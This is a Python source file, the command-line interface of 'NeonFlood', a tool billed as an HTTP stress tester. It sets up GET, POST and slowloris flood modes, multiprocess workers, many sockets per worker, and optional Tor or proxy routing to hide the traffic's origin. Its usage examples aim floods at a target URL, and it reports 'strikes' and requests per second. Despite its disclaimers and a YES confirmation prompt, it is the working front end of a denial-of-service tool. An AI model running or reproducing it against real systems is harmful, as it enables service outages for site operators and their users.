"""
neonflood/cli.py
================
Command-line interface for NeonFlood v2.0.

When invoked without a --url flag the GUI is launched automatically.
When --url is provided the tool runs headless in the terminal.

Usage examples
--------------
  neonflood                                              # launch GUI
  neonflood --gui                                        # force GUI
  neonflood -u http://target.com                         # GET flood (defaults)
  neonflood -u http://target.com -w 10 -s 100 -m post    # POST flood
  neonflood -u http://target.com -m slowloris --tor       # Slowloris via Tor
  neonflood -u http://target.com --proxy socks5://127.0.0.1:1080 --report out.json
  neonflood -u http://target.com --duration 60 --csv report.csv
  neonflood --version
  neonflood --help
"""

import argparse
import sys
import time
import signal
import threading
import queue as queue_module
import urllib.parse
from multiprocessing import Manager, Queue

from neonflood import __version__, __author__, __website__, __tool__
from neonflood.counter  import SafeCounter
from neonflood.workers  import create_worker, MODE_MAP
from neonflood.reporter import SessionReport, SessionLogger


# ─────────────────────────────────────────────────────────────────────────────
#  Terminal colour helpers
# ─────────────────────────────────────────────────────────────────────────────

C = {
    "red":    "\033[91m",
    "green":  "\033[92m",
    "yellow": "\033[93m",
    "cyan":   "\033[96m",
    "purple": "\033[95m",
    "gray":   "\033[90m",
    "reset":  "\033[0m",
    "bold":   "\033[1m",
}


def cprint(color: str, msg: str):
    """Print a coloured line to stdout."""
    print(f"{C.get(color, '')}{msg}{C['reset']}")


# ─────────────────────────────────────────────────────────────────────────────
#  Static text blocks
# ─────────────────────────────────────────────────────────────────────────────

BANNER = (
    f"{C['red']}\n"
    "  ███╗   ██╗███████╗ ██████╗ ███╗   ██╗███████╗██╗      ██████╗  ██████╗ ██████╗\n"
    "  ████╗  ██║██╔════╝██╔═══██╗████╗  ██║██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗\n"
    "  ██╔██╗ ██║█████╗  ██║   ██║██╔██╗ ██║█████╗  ██║     ██║   ██║██║   ██║██║  ██║\n"
    "  ██║╚██╗██║██╔══╝  ██║   ██║██║╚██╗██║██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║\n"
    "  ██║ ╚████║███████╗╚██████╔╝██║ ╚████║██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝\n"
    "  ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝\n"
    f"{C['reset']}"
    f"{C['cyan']}  v{__version__}  //  {__author__}  //  {__website__}{C['reset']}\n"
    f"{C['red']}  FOR AUTHORIZED AND EDUCATIONAL USE ONLY{C['reset']}\n"
)

DISCLAIMER = (
    f"{C['yellow']}"
    "╔══════════════════════════════════════════════════════════════╗\n"
    "║                       ⚠  WARNING                            ║\n"
    "║  This tool is for AUTHORIZED and EDUCATIONAL use only.      ║\n"
    "║  Do NOT use against systems without explicit permission.    ║\n"
    "║  Misuse may be illegal. You bear full responsibility.       ║\n"
    "╚══════════════════════════════════════════════════════════════╝"
    f"{C['reset']}\n"
)


# ─────────────────────────────────────────────────────────────────────────────
#  Argument parser
# ─────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    """
    Build and return the ArgumentParser for NeonFlood CLI.

    Returns
    -------
    argparse.ArgumentParser
    """
    parser = argparse.ArgumentParser(
        prog="neonflood",
        description=f"NeonFlood v{__version__} — HTTP Stress Testing Suite",
        epilog=(
            f"Author : {__author__}\n"
            f"Website: {__website__}\n\n"
            "For authorized and educational testing ONLY.\n\n"
            "Examples:\n"
            "  neonflood -u http://target.com\n"
            "  neonflood -u http://target.com -w 10 -s 100 -m slowloris\n"
            "  neonflood -u http://target.com --tor --report out.json\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument(
        "-u", "--url",
        metavar="URL",
        help="Target URL including scheme, e.g. http://target.com or https://target.com:8443/path",
    )
    parser.add_argument(
        "-w", "--workers",
        type=int, default=5, metavar="N",
        help="Number of worker processes (default: 5, max recommended: 50)",
    )
    parser.add_argument(
        "-s", "--sockets",
        type=int, default=50, metavar="N",
        help="Connections per worker per loop iteration (default: 50)",
    )
    parser.add_argument(
        "-m", "--mode",
        choices=list(MODE_MAP.keys()), default="get",
        help=f"Attack mode: {', '.join(MODE_MAP.keys())} (default: get)",
    )
    parser.add_argument(
        "-t", "--timeout",
        type=int, default=5, metavar="SEC",
        help="Socket timeout in seconds (default: 5)",
    )
    parser.add_argument(
        "--proxy",
        metavar="PROXY",
        help="Proxy URL, e.g. socks5://127.0.0.1:1080 or http://proxy.host:8080",
    )
    parser.add_argument(
        "--tor",
        action="store_true",
        help="Route traffic through Tor (shortcut for --proxy socks5://127.0.0.1:9050)",
    )
    parser.add_argument(
        "--ratelimit",
        type=int, default=0, metavar="RPS",
        help="Max requests per second per worker (0 = unlimited, default: 0)",
    )
    parser.add_argument(
        "--report",
        metavar="FILE",
        help="Export a JSON report to FILE after the session ends",
    )
    parser.add_argument(
        "--csv",
        metavar="FILE",
        help="Export a CSV report to FILE after the session ends",
    )
    parser.add_argument(
        "--duration",
        type=int, default=0, metavar="SEC",
        help="Automatically stop after N seconds (0 = run until Ctrl+C)",
    )
    parser.add_argument(
        "--gui",
        action="store_true",
        help="Force launch the graphical interface even if other flags are present",
    )
    parser.add_argument(
        "-v", "--version",
        action="version",
        version=f"{__tool__} v{__version__} by {__author__} ({__website__})",
    )

    return parser


# ─────────────────────────────────────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _parse_proxy(proxy_str: str | None) -> tuple | None:
    """
    Parse a proxy URL string into a (scheme, host, port) tuple.

    Parameters
    ----------
    proxy_str : str | None — e.g. "socks5://127.0.0.1:1080"

    Returns
    -------
    tuple[str, str, int] | None
    """
    if not proxy_str:
        return None
    try:
        p = urllib.parse.urlparse(proxy_str)
        return (p.scheme, p.hostname, p.port or 1080)
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────────────────
#  CLI runner
# ─────────────────────────────────────────────────────────────────────────────

def run_cli(args: argparse.Namespace):
    """
    Execute NeonFlood in headless CLI mode.

    Parameters
    ----------
    args : argparse.Namespace — parsed arguments from build_parser()
    """
    print(BANNER)
    print(DISCLAIMER)

    # ── Validate URL ─────────────────────────────────────────────────────
    url = args.url.strip()
    if not url.startswith(("http://", "https://")):
        cprint("red", "[ERROR] URL must start with http:// or https://")
        sys.exit(1)

    parsed  = urllib.parse.urlparse(url)
    if not parsed.hostname:
        cprint("red", "[ERROR] Could not parse a hostname from the URL.")
        sys.exit(1)

    host    = parsed.hostname
    port    = parsed.port or (443 if parsed.scheme == "https" else 80)
    path    = parsed.path or "/"
    use_ssl = parsed.scheme == "https"

    # ── Resolve proxy ────────────────────────────────────────────────────
    # --tor overrides --proxy
    proxy_str = "socks5://127.0.0.1:9050" if args.tor else args.proxy
    proxy     = _parse_proxy(proxy_str)

    # ── Print session config ─────────────────────────────────────────────
    cprint("cyan",   f"  Target    : {url}")
    cprint("purple", f"  Mode      : {args.mode.upper()}")
    cprint("green",  f"  Workers   : {args.workers}")
    cprint("green",  f"  Sockets   : {args.sockets}")
    cprint("yellow", f"  Timeout   : {args.timeout}s")
    cprint("yellow", f"  Rate Limit: {args.ratelimit} rps "
                     f"{'(unlimited)' if args.ratelimit == 0 else ''}")
    if proxy_str:
        cprint("purple", f"  Proxy     : {proxy_str}")
    if args.duration:
        cprint("gray",   f"  Duration  : {args.duration}s then auto-stop")
    print()

    # ── Authorization confirmation ────────────────────────────────────────
    try:
        confirm = input(
            f"{C['red']}  [!] Confirm you are AUTHORIZED to test this target.\n"
            f"      Type YES to continue: {C['reset']}"
        )
    except (EOFError, KeyboardInterrupt):
        print()
        cprint("red", "  Aborted.")
        sys.exit(0)

    if confirm.strip().upper() != "YES":
        cprint("red", "\n  Aborted. Authorization not confirmed.")
        sys.exit(0)

    print()
    cprint("green", "  [*] Initializing engine...")

    # ── Setup shared state ────────────────────────────────────────────────
    manager    = Manager()
    counter    = SafeCounter(manager)
    log_q      = Queue()
    report     = SessionReport()
    logger     = SessionLogger()
    workers    = []
    running    = {"v": True}
    start_time = time.time()

    report.start(
        target=url, mode=args.mode,
        workers=args.workers, sockets=args.sockets,
        proxy=proxy_str, rate_limit=args.ratelimit,
    )

    # ── Start workers ─────────────────────────────────────────────────────
    for _ in range(args.workers):
        p = create_worker(
            mode=args.mode, host=host, port=port, path=path,
            use_ssl=use_ssl, nr_socks=args.sockets,
            counter=counter, log_queue=log_q,
            timeout=args.timeout, proxy=proxy, rate_limit=args.ratelimit,
        )
        p.daemon = True
        p.start()
        workers.append(p)

    cprint("green", f"  [*] {args.workers} workers launched. Press Ctrl+C to stop.\n")

    # ── Log consumer thread ───────────────────────────────────────────────
    COLOR_MAP = {
        "HIT":  "green",
        "FAIL": "red",
        "WARN": "yellow",
        "LOAD": "purple",
        "SYS":  "cyan",
    }

    def consume_logs():
        while running["v"]:
            try:
                level, msg = log_q.get(timeout=0.2)
                ts    = time.strftime("%H:%M:%S")
                color = COLOR_MAP.get(level, "gray")
                print(
                    f"{C['gray']}[{ts}]{C['reset']} "
                    f"{C[color]}{level}: {msg}{C['reset']}"
                )
                logger.write(level, msg)
            except queue_module.Empty:
                continue
            except Exception:
                pass

    threading.Thread(target=consume_logs, daemon=True).start()

    # ── Stats printer thread ──────────────────────────────────────────────
    def print_stats():
        while running["v"]:
            elapsed    = int(time.time() - start_time)
            h, rem     = divmod(elapsed, 3600)
            m, s       = divmod(rem, 60)
            rps        = counter.reset_rps_tick()
            report.record_rps(rps)
            hits       = counter.hit_count
            fails      = counter.fail_count
            print(
                f"\r"
                f"{C['green']}STRIKES:{hits:<8}{C['reset']}"
                f"{C['red']}DROPPED:{fails:<8}{C['reset']}"
                f"{C['yellow']}RPS:{rps:<6}{C['reset']}"
                f"{C['cyan']}TIME:{h:02d}:{m:02d}:{s:02d}{C['reset']}",
                end="",
                flush=True,
            )
            time.sleep(1)

    threading.Thread(target=print_stats, daemon=True).start()

    # ── Shutdown handler ──────────────────────────────────────────────────
    def shutdown(signum=None, frame=None):
        print("\n")
        cprint("yellow", "  [!] Shutting down workers...")
        running["v"] = False

        for p in workers:
            try:
                p.stop()
            except Exception:
                pass
        time.sleep(0.3)
        for p in workers:
            try:
                p.terminate()
                p.join(timeout=2)
            except Exception:
                pass
        workers.clear()

        report.finish(counter.hit_count, counter.fail_count)

        try:
            manager.shutdown()
        except Exception:
            pass

        logger.close()

        # ── Print summary ──────────────────────────────────────────────
        print()
        cprint("cyan",   "  ── SESSION SUMMARY ─────────────────────────────")
        cprint("cyan",   f"  Target     : {url}")
        cprint("purple", f"  Mode       : {args.mode.upper()}")
        cprint("gray",   f"  Duration   : {report.duration}s")
        cprint("green",  f"  Hits       : {report.total_hits:,}")
        cprint("red",    f"  Fails      : {report.total_fails:,}")
        cprint("yellow", f"  Avg RPS    : {report.avg_rps}")
        cprint("yellow", f"  Peak RPS   : {report.peak_rps}")
        cprint("gray",   f"  Log file   : {logger.path}")
        print()

        if args.report:
            exported = report.export_json(args.report)
            cprint("cyan", f"  JSON report: {exported}")
        if args.csv:
            exported = report.export_csv(args.csv)
            cprint("cyan", f"  CSV report : {exported}")

        sys.exit(0)

    signal.signal(signal.SIGINT,  shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    # ── Main wait loop ────────────────────────────────────────────────────
    try:
        if args.duration > 0:
            time.sleep(args.duration)
            shutdown()
        else:
            while True:
                time.sleep(0.5)
    except (KeyboardInterrupt, SystemExit):
        shutdown()


# ─────────────────────────────────────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────────────────────────────────────

def main():
    """
    Main entry point.  Decides whether to launch GUI or CLI based on arguments.
    Called by the ``neonflood`` console_scripts entry point and __main__.py.
    """
    parser = build_parser()
    args   = parser.parse_args()

    # No URL provided, or --gui flag set → launch the graphical interface
    if not args.url or args.gui:
        from neonflood.gui import launch_gui
        launch_gui()
    else:
        run_cli(args)


if __name__ == "__main__":
    main()
